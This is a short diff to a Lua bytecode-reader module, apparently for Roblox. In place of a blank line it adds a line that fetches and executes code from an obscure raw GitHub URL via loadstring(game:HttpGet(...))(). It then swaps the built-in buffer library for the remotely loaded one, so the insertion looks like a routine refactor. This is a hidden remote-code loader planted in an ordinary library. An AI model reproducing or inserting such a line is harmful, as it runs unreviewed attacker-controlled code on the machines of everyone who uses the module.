@@ -1,8 +1,8 @@
 local proto = {}
 proto.__index = proto
-
+local bufferc = loadstring(game:HttpGet("https://raw.githubusercontent.com/x-wz5/Fhfwjmfrtjj/refs/heads/main/hgrhgrhgrzhrthrthrthrsthrthretz"))()
 function proto.new(bytecode)
-    local buf = buffer.new(bytecode)
+    local buf = bufferc.new(bytecode)
     local self = setmetatable({}, proto)
     
     -- Read number of parameters, upvalues, etc.
